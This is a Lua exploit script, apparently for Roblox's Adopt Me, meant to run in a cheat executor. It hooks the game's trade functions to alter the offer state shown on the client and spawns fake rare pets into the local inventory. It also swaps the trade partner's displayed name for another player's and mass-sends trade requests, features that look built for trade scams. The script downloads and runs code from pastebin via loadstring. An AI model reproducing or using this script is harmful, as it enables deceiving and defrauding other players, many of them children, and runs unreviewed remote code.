local func
local TradeApp = require(game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps.TradeApp)
local v_u_1 = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
local v_u_3 = v_u_1("RouterClient")
local_offer = nil

local old1
local old2
local old3
local old4
local old5

local petstbl = {
	"Bat Dragon",
	"Frost Dragon",
	"Shadow Dragon",
	"Giraffe",
	"Owl",
	"Parrot",
	"Crow",
	"Evil Unicorn",
	"Arctic Reindeer",
	"Diamond Butterfly",
	"Hedgehog",
	"Balloon Unicorn",
	"Blazing Lion",
	"Dalmatian",
	"Orchid Butterfly",
	"Turtle",
	"Pelican",
	"Monkey King",
	"Albino Monkey",
	"Haetae",
	"Frostbite Bear",
	"Strawberry Shortcake Bat Dragon",
	"Hot Doggo",
	"Chocolate Chip Bat Dragon",
	"Kangaroo",
	"Cow",
	"Pirate Ghost Capuchin Monkey",
	"Flamingo",
	"African Wild Dog",
	"Peppermint Penguin",
	"Lion",
	"Crocodile",
	"Elephant",
	"Blue Dog",
	"Caterpillar",
	"Frost Fury",
	"Lava Dragon",
	"Golden Penguin",
	"Candyfloss Chick",
	"Nessie",
	"Vampire Dragon",
	"Winged Tiger",
	"Sugar Glider",
	"Mechapup",
	"Fairy Bat Dragon",
	"Undead Jousting Horse",
	"Cupid Dragon",
	"Golden Chow-Chow",
	"Mini Pig",
	"Irish Water Spaniel",
	"Goat",
	"Glacier Moth",
	"Sheeeeep",
	"Goose",
	"Pig",
	"Pink Cat",
	"Meerkat"

}

for k,v in pairs(getgc(true)) do
	if typeof(v) == "table" and rawget(v,"trade") then
		for kk,vv in pairs(v['trade']) do
			if typeof(tonumber(kk)) == "number" then
				func = vv
			end
		end
	end
end

old1 = hookfunction(TradeApp._change_local_trade_state,function(a,b)
	for k,v in pairs(b) do
		print(k)
		if k == "sender_offer" or k == "recipient_offer" then -- в конф нет айтемов
			for kk,vv in pairs(v) do
				if kk == "items" then
					local_offer = v.items
				end
			end
		else

		end
	end
	return old1(a,b)
end)
old2 = hookfunction(TradeApp._overwrite_local_trade_state,function(a,b)
	if a~=nil and b~= nil and local_offer ~= nil then
		if game.Players.LocalPlayer == b.sender then
			b.sender_offer.items = local_offer
		else
			b.recipient_offer.items = local_offer
		end
	end
	return old2(a,b)
end)
old3 = hookfunction(TradeApp._remove_item_from_my_offer,function(p174, p175)

	local function findKey(alltables,needtable)
		for k,v in pairs(alltables) do
			if v["unique"] == needtable["unique"] then
				return k
			end
		end
	end

	if p175.category == "houses" then
		p174.UIManager.apps.HintApp:hint({
			["text"] = "You can't remove this item.",
			["length"] = 5,
			["overridable"] = true
		})
	else
		v_u_3.get("TradeAPI/RemoveItemFromOffer"):FireServer(p175.unique)
		local v176, v177 = p174:_get_my_offer()
		local v178 = findKey(v176.items,p175)
		table.remove(v176.items, v178)
		local v179 = {
			[v177] = {
				["items"] = v176.items
			}
		}
		p174:_change_local_trade_state(v179)
		p174:_lock_trade_for_appropriate_time()
		p174:refresh_all()
	end
end)
old4 = hookfunction(func,function(...)
	local args = {...}

	if #args > 2 then
		for k,v in pairs(args) do
			if typeof(v) == "table" then
				print(local_offer)
				if local_offer ~= nil then

					if game.Players.LocalPlayer == v.sender then
						v["sender_offer"]["items"] = local_offer
					else
						v["recipient_offer"]["items"] = local_offer
					end
				end
			end
		end
	else

	end

	return old4(unpack(args))
end)
old5 = hookfunction(TradeApp.hide,function(...)

	local v_u_1 = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
	local v_u_10 = v_u_1("ClientData")

	if local_offer ~= nil then
		for k,v in pairs(v_u_10.get("inventory")["pets"]) do
			for kk,vv in pairs(local_offer) do
				if vv['unique'] == k then
					v_u_10.get("inventory")["pets"][k] = nil
				end
			end
		end
	end

	local_offer = nil
	return old5(...)
end)

getgenv().petname = "Dog"
getgenv().ride = false
getgenv().fly = false
getgenv().neon = false
getgenv().meganeon = false

local function makePetPattern(id,kind,unique,neon,mega,fly,ride, stacks)
	local ageRandom = 3
	if stacks then
		ageRandom = math.random(1, 2000000)
	end
	if neon then
		neon = true
		mega = false
	elseif mega then
		neon = false
		mega = true
	end
	return {
		["unique"] = unique,
		["category"] = "pets",
		["id"] = id,
		["kind"] = kind,
		["properties"] = {
			["pet_trick_level"] = 0,
			["rideable"] = false,
			['friendship_level'] = 0,
			["age"] = ageRandom,
			["flyable"] = fly,
			["rideable"] = ride,
			["neon"] = neon,
			["mega_neon"] = mega,
			["ailments_completed"] = 0
		},
		["newness_order"] = 0
	}
end
local function createPet(name,fly,ride,neon,meganeon, stacks)
	local m = require(game:GetService("ReplicatedStorage").ClientDB.Inventory.InventoryDB)
	for k,v in pairs(m.pets) do
		if v["name"]:lower() == name:lower() then
			local uniq = "2_"..tostring(math.random(1,2000000))
			local v_u_1 = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
			local v_u_10 = v_u_1("ClientData")
			v_u_10.get("inventory")["pets"][uniq] = makePetPattern(v['id'],v['kind'],uniq,neon,meganeon,fly,ride, stacks)
		end
	end
end
local function isPetExist(petname)
	local m = require(game:GetService("ReplicatedStorage").ClientDB.Inventory.InventoryDB)
	for k,v in pairs(m.pets) do
		if v["name"] == petname then
			return true
		end
	end
	return false
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ImGui =  loadstring(game:HttpGet('https://pastebin.com/raw/3Sp2zUFP'))()
local Window = ImGui:CreateWindow({
	Title = "Adopt Me Live Helper | " .. game.Players.LocalPlayer.Name,
	Size = UDim2.new(0, 290, 0, 250),
	Position = UDim2.new(0.10, 0, 0, 70)
})
Window:Center()

local AdoptMeHelper = {
	Nicknames = {
		Nickname = nil,
		Status = "Not Changed"
	},
	Trades = {
		SelectedTradePlayer = nil
	}
}

local load = require(game.ReplicatedStorage:WaitForChild("Fsys")).load

local getData = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data
local petDatabase = require(game.ReplicatedStorage.ClientDB.Inventory.InventoryDB).pets
local RouterClient = load("RouterClient")
local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")

local negotiationFrameHeader = LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame.Header
local partFrame = negotiationFrameHeader.PartnerFrame
local confrirmHeader = LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame
local part2Frame = LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerLabel
local cloned = partFrame:Clone()

local TradeTab = Window:CreateTab({
	Name = "Trade",
	Visible = true
})
TradeTab:Separator({Text = "Change Nicknames"})
local StatusNicknameText 
local StatusNicknameStatusText
local PlayerCombo = TradeTab:Combo({
	Placeholder = "Select player",
	Label = "Players (0)",
	Items = {},
	Callback = function(self, Value)
		AdoptMeHelper.Nicknames.Nickname = string.lower(Value)
	end,
})
TradeTab:InputText({
	PlaceHolder = "Search player",
	Callback = function(self, text)
		local filtered = {}
		for _, plr in ipairs(Players:GetPlayers()) do
			if text == "" or string.find(plr.Name:lower(), text:lower()) then
				filtered[plr.Name] = plr.Name
			end
		end
		PlayerCombo.Items = filtered
	end,
})
TradeTab:Button({
	Text = "Make Name",
	Callback = function(self)
		if AdoptMeHelper.Nicknames.Nickname ~= nil then
			if AdoptMeHelper.Nicknames.Nickname ~= nil then
				if not negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame") and not confrirmHeader:FindFirstChild("ClonedPartneredFrame") then
					local newClone = partFrame:Clone()
					newClone.Parent = negotiationFrameHeader
					newClone.Name = "ClonedPartneredFrame"
					newClone.NameLabel.Text = AdoptMeHelper.Nicknames.Nickname
					newClone.Visible = true

					partFrame.Visible = false

					local newclone2 = part2Frame:Clone()
					newclone2.Parent = confrirmHeader
					newclone2.Name = "ClonedPartneredFrame"
					newclone2.Text = AdoptMeHelper.Nicknames.Nickname
					newclone2.Visible = true
					part2Frame.Visible = false

					AdoptMeHelper.Nicknames.Status = "Changed"

					StatusNicknameText.Text = "Nickname: " .. AdoptMeHelper.Nicknames.Nickname
					StatusNicknameStatusText.Text = "Status: " .. AdoptMeHelper.Nicknames.Status
				end
			end


		end
	end,
})
TradeTab:Button({
	Text = "Reload",
	Callback = function(self)                                                                 
		if negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame") then
			negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame") :Destroy()
		end
		if confrirmHeader:FindFirstChild("ClonedPartneredFrame") then                                                            
			confrirmHeader:FindFirstChild("ClonedPartneredFrame"):Destroy()
		end
		partFrame.Visible = true
		part2Frame.Visible = true

		AdoptMeHelper.Nicknames.Status = "Not Changed"
		AdoptMeHelper.Nicknames.Nickname = nil

		PlayerCombo:SetPlaceholder("Select player")
		StatusNicknameText.Text = "Nickname: none"
		StatusNicknameStatusText.Text = "Status: Not Changed"
	end,
})
TradeTab:Separator({Text = "Status"})

StatusNicknameText = TradeTab:Label()
StatusNicknameStatusText = TradeTab:Label()

StatusNicknameText.Text = "Nickname: none"
StatusNicknameStatusText.Text = "Status: Not Changed"

local function UpdatePlayers()
	local items = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		items[plr.Name] = plr.Name
	end
	PlayerCombo.Items = items
	PlayerCombo:SetLabel("Players ("..#Players:GetPlayers()..")")
end
Players.PlayerAdded:Connect(UpdatePlayers)
Players.PlayerRemoving:Connect(UpdatePlayers)
UpdatePlayers()

TradeTab:Separator({Text = "Trade Actions"})
local TradePlayerCombo = TradeTab:Combo({
	Placeholder = "Select player",
	Label = "Players (0)",
	Items = {},
	Callback = function(self, Value)
		AdoptMeHelper.Trades.SelectedTradePlayer = Players[Value]
	end
})
TradeTab:InputText({
	PlaceHolder = "Search player",
	Callback = function(self, text)
		local filtered = {}
		for _, plr in ipairs(Players:GetPlayers()) do
			if text == "" or string.find(plr.Name:lower(), text:lower()) then
				filtered[plr.Name] = plr.Name
			end
		end
		TradePlayerCombo.Items = filtered
	end
})
TradeTab:Button({
	Text = "Send Trade",
	Callback = function()
		if AdoptMeHelper.Trades.SelectedTradePlayer then
			SendTradeRequest:FireServer(AdoptMeHelper.Trades.SelectedTradePlayer)
		end
	end
})
TradeTab:Button({
	Text = "Send Trade all players",
	Callback = function()
		for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
			SendTradeRequest:FireServer(Player)
		end
	end
})
local function UpdateTradePlayers()
	local items = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		items[plr.Name] = plr.Name
	end
	TradePlayerCombo.Items = items
	TradePlayerCombo:SetLabel("Players ("..#Players:GetPlayers()..")")
end
Players.PlayerAdded:Connect(UpdateTradePlayers)
Players.PlayerRemoving:Connect(UpdateTradePlayers)
UpdateTradePlayers()
local PetsTab = Window:CreateTab({
	Name = "Pets",
	Visible = false
})
PetsTab:Separator({Text = "Spawn Random Pets"})
PetsTab:Button({
	Text = "Spawn high tier pets",
	Callback = function(self)
		for _,namepet in pairs(petstbl) do
			for i = 1,math.random(1,2) do
				createPet(namepet,math.random(0,1) == 1,math.random(0,1) == 1,math.random(0,1) == 1,math.random(0,1) == 1,true)
			end
		end
	end,
})
--[[
PetsTab:Button({
	Text = "Spawn stacks high tier pets",
	Callback = function(self)
		for _,namepet in pairs(petstbl) do
			for i = 1,math.random(1,5) do
				createPet(namepet,true,true,true,false,false)
			end
		end
	end,
})
]]
